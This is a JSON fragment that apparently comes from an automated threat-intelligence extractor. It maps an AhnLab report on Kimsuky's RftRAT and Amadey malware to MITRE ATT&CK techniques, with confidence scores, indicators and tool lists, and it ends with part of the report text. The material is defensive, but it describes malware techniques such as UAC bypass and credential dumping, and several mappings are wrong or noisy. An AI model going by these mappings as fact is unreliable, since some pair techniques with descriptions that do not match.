            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "74b28720-2873-4c77-b521-c10966f8b9a1",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Execution through API",
            "attack_id": "T1106",
            "tactic": "Execution",
            "description": "RftRAT writes the received commands to the path %APPDATA%\\asc\\t1.pb before decrypting them",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%APPDATA%\\asc\\t1.pb"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4fbb19b9-8cf5-401e-bf27-ef2b98c52649",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "UAC Bypass",
            "attack_id": "T1548.002",
            "tactic": "Privilege Escalation",
            "description": "ICMLuaUtil used to bypass UAC",
            "confidence_score": 0.662,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ICMLuaUtil"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "ICMLuaUtil",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8489b1d8-530a-4aad-8688-f2251c2997ac",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Hollowing",
            "attack_id": "T1093",
            "tactic": "Defense Evasion",
            "description": "RftRAT can receive commands from the C&C server and execute them",
            "confidence_score": 0.66,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RftRAT"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "149ce1a0-45b6-4a74-851c-8921b3439121",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Credential Access",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Mimikatz was detected as a tool used by the threat actor",
            "confidence_score": 0.658,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.238,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "mimikatz.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cbd0593e-c074-4ff2-bd9c-23e24f4772af",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Control",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "The infected system's information is transmitted to the C&C server",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C&C server"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "db44028a-4e54-4510-a0e9-f289b1fc9131",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Remote Desktop Protocol",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "The threat actor used RDP for information theft",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RDP Wrapper",
              "3389"
            ],
            "tools": [
              "rundll32",
              "RDP",
              "at",
              "metasploit",
              "Rundll32",
              "zip",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "605fc87c-a5f8-406a-b436-e693766c26ff",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "PowerShell",
            "attack_id": "T1086",
            "tactic": "Execution",
            "description": "Detected PowerShell activity via NLP pattern matching",
            "confidence_score": 0.654,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "ebedf6e9-5fec-4006-9a60-88bd261e535e",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "Amadey searches for product names from South Korean companies",
            "confidence_score": 0.653,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "product names"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e9b97de9-46e5-4285-bce5-2038925c8e0b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Defensive Evasion",
            "attack_id": "T1112",
            "tactic": "Defensive Evasion",
            "description": "Detected use of Rundll32 for potential malicious code execution",
            "confidence_score": 0.651,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.192,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "rundll32.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ca7a0690-519e-4856-87db-205540af3c86",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "Amadey collects system information from the infected system",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "system information"
            ],
            "tools": [
              "Amadey",
              "at",
              "metasploit",
              "rundll32",
              "Rundll32",
              "zip",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8f219da0-9dcf-46c0-ba3f-0fe0d563a163",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "RftRAT uses specific path names for saving data",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "A1CCA2EC-C09F-D33C-4317-7F71F0E2A976_0"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "777df74c-3a69-4432-85a2-75e6c8eecacd",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Credential Access",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Detected use of Mimikatz for potential credential theft",
            "confidence_score": 0.647,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.169,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "mimikatz.exe"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2187d828-5a7a-4102-b9a9-a32380c70cf0",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Collection",
            "attack_id": "T1005",
            "tactic": "Collection",
            "description": "Detected use of Keylogger for potential keystroke logging",
            "confidence_score": 0.647,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.169,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "keylogger"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "Keylogger",
              "NET",
              "ping",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b9b61d4a-94fe-4692-9530-fd04d3466beb",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "RftRAT saves C&C communication and command results",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C&C communication"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "520d6192-7c16-4855-9c1a-401a62f27c9f",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "AutoIt script used for malicious purposes",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "AutoIt"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "PowerShell",
              "Mimikatz",
              "mimikatz",
              "reg",
              "AutoIt",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5480018a-cf3b-4aca-a8d0-84fc598e600f",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "RftRAT injects into svchost.exe",
            "confidence_score": 0.642,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "svchost.exe",
              "RftRAT"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ae2069e2-9203-4288-ad6e-09a28b50f0ad",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b05a63ee-38ea-400d-b467-ed0187ca5896",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a162f56c-5cd4-448f-a441-20bdfe826e6c",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Credential Access",
            "description": "RftRAT creates an Infostealer",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Infostealer"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6e7de3a9-24b7-4341-8355-ef640f481b1b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "RftRAT packed in VMP",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "VMP"
            ],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "VMP",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "31c692b2-6165-4f44-85de-92dd9d3bd1f0",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "File Deletion",
            "attack_id": "T1107",
            "tactic": "Defense Evasion",
            "description": "RftRAT can delete files",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "0x06"
            ],
            "tools": [
              "RftRAT",
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7536ef67-0d66-465a-9a66-3506e41b8077",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9f06163c-88e1-43b0-9d3b-93d9400d5f4b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a99e9fd1-4d32-4908-817b-01d0ec059bc5",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "45b7406f-f76d-4512-b94a-8a3e6f0cbd05",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "OS Credential Dumping",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Detected OS Credential Dumping activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a4cc84fa-1597-42db-a68f-47edae9a8d3a",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "099f525e-72b9-46f2-8cbd-8204cedabd18",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Input Capture",
            "attack_id": "T1056",
            "tactic": "Credential Access",
            "description": "Detected Input Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "2f21ea69-78fd-4536-8791-5f385be08b83",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "bc33acc3-2301-4d45-bdf1-6d8b5b7cc00b",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "Remote Desktop Protocol",
            "attack_id": "T1021.001",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Desktop Protocol activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "680cd5d3-7ff2-4396-a2be-b2b267e46639",
            "report_id": "pdf-b4148f3619db75c6ecf55419b05a04b6",
            "technique_name": "User Execution: Malicious File",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "rundll32",
              "at",
              "metasploit",
              "zip",
              "Rundll32",
              "sc",
              "Mimikatz",
              "PowerShell",
              "mimikatz",
              "reg",
              "powershell",
              "ping",
              "NET",
              "Metasploit"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 2 0 By Sanseo December 8  2023 Kimsuky Group Uses AutoIt to Create Malware (RftRAT  Amadey) asec.ahnlab.com/en/59590 Overview Initial Access  . 2.1. Spear Phishing Attack  . 2.2. LNK Malware Remote Control Malware  . 3.1. XRat (Loader)  . 3.2. Amadey  . 3.3. Latest Attack Cases   .. 3.3.1. AutoIt Amadey   .. 3.3.2. RftRAT Post-infection  . 4.1. Keylogger  . 4.2. Infostealer  . 4.3. Other Types Conclusion 1. Overview The Kimsuky threat group  deemed to be supported by North Korea  has been active since 2013. At first  they attacked North Korea-related research institutes in South Korea before attacking a South Korean energy corporation in 2014. Cases of attacks against countries other than South Korea have also been identified since 2017. [1] The group usually employs spear phishing attacks against the national defense sector  defense industries  the press  the diplomatic sector  national organizations  and academic fields to steal internal information and technology from organizations. [2] (This link is only available in Korean.) Even until recently  the Kimsuky group was still mainly employing spear phishing attacks to gain initial access. What makes the recent attacks different from the previous cases is that more LNK shortcut-type malware are being used instead of malware in Hangul Word Processor (HWP) or MS Office document format. The threat actor led users to download a compressed file through attachments or download links within spear phishing emails. When this compressed file is decompressed  it yields a legitimate document file along with a malicious LNK file. ASEC is monitoring the Kimsuky group s attacks using LNK-type malware and is continuously posting identified cases of attacks on the ASEC Blog. The Kimsuky group installs remote control malware to control the infected system after completing such steps to 2 / 2 0 gain initial access. Malware used by the Kimsuky group not only include custom-made such as AppleSeed and PebbleDash [3]  but also open-source or commercial malware such as XRat [4]  HVNC [5]  Amadey [6]  and Metasploit Meterpreter [7]. After gaining control  the threat actor ultimately uses RDP or installs Google s Chrome Remote Desktop [8] to exfiltrate information from the infected system. Here we analyze Amadey and RftRAT which were recently found being distributed. Amadey and RftRAT were constantly used throughout 2023 alongside XRat. However  recent types showed that they were created with AutoIt. This post also covers Infostealers additionally installed by the Kimsuky group using remote control malware. While remote control-type malware continuously change  the malware installed through these have not changed much in the attacks in 2023. 2. Initial Access 2.1. Spear Phishing Attack In the year 2023  ASEC covered cases of LNK malware distribution in posts such as  Malicious LNK File Disguised as a Normal HWP Document  [9]   Malicious LNK File Being Distributed  Impersonating the National Tax Service  [10]  and  Distribution of Malicious LNK File Disguised as Producing Corporate Promotional Materials  [11]. By attaching files or including download links in the emails  the threat actor prompted users to download the compressed file and execute the LNK shortcut file inside. 3 / 2 0 Figure 1. LNK malware included in compressed files 2.2. LNK Malware The LNK file contains an encrypted compressed file  which in turn holds various malware in script format. 4 / 2 0 Figure 2. Malware in script format contained within LNK files Executing the LNK file decompresses the file  and ultimately  the script malware is run. The BAT and VBS scripts inside can either be used for executing other scripts or contain an Infostealer responsible for collecting and exfiltrating information from the infected system. There is also a script for maintaining persistence as well as a downloader that downloads and executes additional payloads from an external source. As such  malware in script format that run in infected systems install additional malware from an external source  major examples of which are backdoors called XRat  Amadey  and RftRAT. While these malware are all packed with VMP when in distribution  recently  Amadey and RftRAT variants created with AutoIt have been used. After a remote control malware is installed  keyloggers and Infostealers are installed to steal internal information and technology from the organizations. 3. Remote Control Malware 3.1. XRat (QuasarRAT) XRat is a RAT malware developed in .NET and was created based on QuasarRAT published on 